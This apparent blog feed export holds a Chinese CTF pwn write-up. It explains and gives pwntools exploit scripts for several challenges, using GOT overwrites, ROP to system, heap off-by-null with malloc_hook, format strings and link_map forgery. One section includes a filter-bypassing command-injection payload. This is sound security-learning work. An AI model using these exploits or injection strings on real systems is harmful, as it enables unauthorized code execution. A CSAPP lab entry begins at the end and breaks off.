        <content type="html"><![CDATA[<p>(<del>距上一次好好看题应该有两个月了吧….</del></p><h2 id="Dream"><a href="#Dream" class="headerlink" title="Dream"></a>Dream</h2><h3 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h3><p>第一次看多线程的题.没开pie和canary.<br>主线程在开启一个子线程后开启沙盒只能使用read,write调用,然后是一个0x10字节的溢出.<br>子线程是一个write的无限循环.</p><span id="more"></span><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>主线程禁掉了open,所以无法进行orw.由于子线程是在主线程开启沙箱前创建的,不受沙箱影响.所以最终是要在子线程中执行system.<br>要通过主线程的溢出劫持子线程的控制流,可以通过线程间共享的got表.将write的got表改为主线程中溢出的地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307161610872.png"></p><p>由于新线程的栈是mmap得到的,所以可以利用其与libc的固定偏移得到.在子线程上再进行栈迁移+rop.<br>(感觉这题的各种偏移巧妙得诡异)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">magic_read = <span class="number">0x4013AE</span></span><br><span class="line">bss = <span class="number">0x404200</span></span><br><span class="line">rdi = <span class="number">0x401483</span></span><br><span class="line">rsi_r15 = <span class="number">0x401481</span> </span><br><span class="line">ret = <span class="number">0x4013c6</span></span><br><span class="line">leave_ret = <span class="number">0x4013c5</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">'''</span></span><br><span class="line"><span class="string">set scheduler-locking on</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">b *0x4013AE</span></span><br><span class="line"><span class="string">thread 2</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#主线程劫持子线程控制流</span></span><br><span class="line">io.recvline()</span><br><span class="line">io.send(<span class="string">b'a'</span>*<span class="number">0x40</span>+p64(bss+<span class="number">0x40</span>)+p64(magic_read))</span><br><span class="line"></span><br><span class="line">payload = flat([rsi_r15,e.got[<span class="string">'write'</span>],<span class="number">0</span>,e.plt[<span class="string">'read'</span>],rdi,<span class="number">0x1000</span>,e.plt[<span class="string">'sleep'</span>]])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([bss-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.send(p64(magic_read))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#子线程栈迁移+rop</span></span><br><span class="line">io.recv()</span><br><span class="line">payload = flat([<span class="string">'a'</span>*<span class="number">0x30</span>,rdi,e.got[<span class="string">'puts'</span>],e.plt[<span class="string">'puts'</span>],p64(magic_read)])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">leak_libc(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"></span><br><span class="line">thread_stack = libc_base-<span class="number">0x41f0</span></span><br><span class="line"></span><br><span class="line">rdi_rbp = libc_base+<span class="number">0x2a745</span></span><br><span class="line"></span><br><span class="line">payload = flat([ret,rdi_rbp,binsh_addr,<span class="number">0</span>,system_addr])</span><br><span class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">b'\x00'</span>)</span><br><span class="line">payload += flat([thread_stack-<span class="number">8</span>,leave_ret])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Noka"><a href="#Noka" class="headerlink" title="Noka"></a>Noka</h2><p>任意地址读写没啥好说的.<br>学到一个trick就是改malloc的got表为一个可控返回值(read_num之类)的函数,再加上之后的read可以达成任意地址写.</p><h2 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h2><p>验证身份,由于snprintf限制了长度0x20,可以将%s后面的.key顶出0x20外截断.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">'admin :'</span>,<span class="string">b'..///////////////////flag'</span>)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180900152.png"><br>然后是一个有过滤的命令拼接.<br>命令之间用’\n’截断,过滤了空格用’\t’分隔参数.<br>注意闭合%s前面的单引号.<br>由于长度限制最后flag用通配符.<br>缓冲区未初始化,所以可以多次写入\n.<br>最后命令是这样的: ‘\ncat\tfl*\n.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180911843.png"><br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307180904864.png"></p><p>由于缓冲区未初始化,也可以在验证函数的栈帧里布置来绕开过滤.</p><h2 id="Approoooooooaching"><a href="#Approoooooooaching" class="headerlink" title="Approoooooooaching"></a>Approoooooooaching</h2><p>Brainfuck的VM(<del>其实到现在对VM的概念都很模糊</del>).<br>洞在执行的时候对v3没有下界检查,可以直接越界修改返回地址,partial overwrite到后门函数.</p><p>(下次一定记得先找后门,还有就是逆向时看个大概就行了,老是想着把每条语句都看懂…)</p><h2 id="can-you-find-me"><a href="#can-you-find-me" class="headerlink" title="can_you_find_me"></a>can_you_find_me</h2><p>2.27的offbynull,没有输出函数,限制free和malloc次数.有一点特殊的是null会写在chunk[size]的地方,也就是只与size有关而与输入长度无关,这也是之后能部分覆写unsortedbin的fd的原因.</p><p>常规流程了,我的布置用完了free的次数所以打malloc_hook</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'2'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">'Index:'</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4f2c5</span>,<span class="number">0x4f322</span>,<span class="number">0x10a38c</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="comment"># offbynull构造堆块重叠,部分覆写unsortedbin</span></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x30</span>,<span class="string">'a'</span>)<span class="comment">#2</span></span><br><span class="line">    add(<span class="number">0x28</span>,<span class="string">'a'</span>)<span class="comment">#3</span></span><br><span class="line">    add(<span class="number">0x4f0</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#5</span></span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'a'</span>*<span class="number">0x20</span>,<span class="number">0x4c0</span>])</span><br><span class="line">    add(<span class="number">0x28</span>,payload)<span class="comment">#1</span></span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x410</span>,<span class="string">'a'</span>)<span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x2f</span>,<span class="string">b'\x60\x07'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 泄露地址</span></span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)<span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x20</span>,p64(<span class="number">0xfbad1800</span>))<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hex</span>(addr).endswith(<span class="string">"7e3"</span>):</span><br><span class="line">            stdout = addr-<span class="number">131</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    io.recvuntil(<span class="string">'1.'</span>)</span><br><span class="line"></span><br><span class="line">    leak_libc(<span class="string">'_IO_2_1_stdout_'</span>,stdout)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x31</span>,malloc_hook_addr-<span class="number">0x8</span>])</span><br><span class="line">    add(<span class="number">0x40</span>,payload)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,p64(libc_base+og[<span class="number">1</span>])+p64(realloc_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># breakrva 0xDA4</span></span><br><span class="line">    <span class="comment"># ''')</span></span><br><span class="line">    io.sendlineafter(<span class="string">'choice:'</span>,<span class="string">'1'</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="Candy-Shop"><a href="#Candy-Shop" class="headerlink" title="Candy_Shop"></a>Candy_Shop</h2><p>两次参数长度8字节的格式化字符串,一次数组越界bss段之前任意写.<br>先泄露地址,改printf的got表为system,完事.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'g'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">'%31$p'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'gift:'</span>)</span><br><span class="line">leak_libc(<span class="string">'__libc_start_main'</span>,<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">'option:'</span>,<span class="string">'b'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'bye:'</span>,<span class="string">'t'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'in?'</span>,<span class="string">'-10'</span>)</span><br><span class="line">io.sendlineafter(<span class="string">'name'</span>,<span class="string">b'\x00'</span>*<span class="number">6</span>+p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">'g'</span>)</span><br><span class="line">io.sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="easynote"><a href="#easynote" class="headerlink" title="easynote"></a>easynote</h2><p>2.23堆溢出,没啥特别的</p><h2 id="fooooood"><a href="#fooooood" class="headerlink" title="fooooood"></a>fooooood</h2><p>bss段格式化字符串,改返回地址和参数就行了<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307211003955.png"><br>(这题不能改printf的got表因为不能一次性改完,下一次执行printf的时候会崩)</p><h2 id="matchmaking-platform"><a href="#matchmaking-platform" class="headerlink" title="matchmaking platform"></a>matchmaking platform</h2><h3 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h3><p>漏洞点在sub_12B7函数,该函数向a1指向空间最多读取128字节(向buf读入了129次),进入最后一次循环时,v3==127,++v3溢出到-0x80,即向a1-0x80地址写一个字节.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292212184.png"><br>程序的主逻辑,配合上该漏洞,可以在times为4,2时修改byte_4140-0x80位置的pptr的低字节,使*pptr的新值为另一个地址,进而在times为3,1的时候在该地址进行写入.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202307292223923.png"><br>于是寻找0x4000-0x4100内的指针,有GOT表和bss段的IO指针.</p><p>则可以先通过IO指针泄露pie基址并在byte_4140上伪造.dynamic以及strtab,再修改linkmap中l_info[5]为伪造的.dynamic,修改l_addr使其偏移.</p><p>使得解析free函数时得到system函数地址,且由于伪造的linkmap中l_addr(程序基地址)加上了偏移使得最终将system地址写入puts的GOT表条目.最终getshell.</p><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,<span class="string">b'a'</span>*<span class="number">128</span>+<span class="string">b'\x80'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([<span class="number">0xfbad1800</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="string">b'\xb0\x5d'</span>])</span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    addr = u64(io.recv(<span class="number">8</span>,<span class="number">0.1</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">"0x56"</span>):</span><br><span class="line">        pie_base = addr-<span class="number">0x40a0</span></span><br><span class="line">        log.success(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b'/bin/sh\x00'</span>+p64(pie_base+<span class="number">0x4140</span>+<span class="number">0x10</span>-<span class="number">0x77</span>)+<span class="string">b'system\x00'</span><span class="comment">#0x77是free字符串在strtab中的偏移</span></span><br><span class="line">    io.sendafter(<span class="string">'&gt;&gt;'</span>,payload.ljust(<span class="number">128</span>,<span class="string">b'\x00'</span>)+<span class="string">b'\x08'</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat([pie_base+<span class="number">0x8</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x68</span>,<span class="string">b'\x00'</span>) + flat([pie_base+<span class="number">0x4140</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io,'''</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x1338)</span></span><br><span class="line">    <span class="comment"># ''')    </span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">'&gt;&gt; '</span>,payload)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(<span class="string">'./'</span>+binary)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>(剩余题目之后单独放)</p>]]></content>
      
      
      <categories>
          
          <category> ctf复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP Labs</title>
      <link href="/2023/CSAPP-Labs/"/>
      <url>/2023/CSAPP-Labs/</url>
      
        <content type="html"><![CDATA[<p>记录CSAPP Lab的一些过程和心得,由于刚开始接触计算机其实完成的质量不高.</p><span id="more"></span><h1 id="Lab1-DataLab"><a href="#Lab1-DataLab" class="headerlink" title="Lab1:DataLab"></a>Lab1:DataLab</h1><p>用位运算实现一些基本操作</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * CS:APP Data Lab </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * &lt;Please put your name and userid here&gt;</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 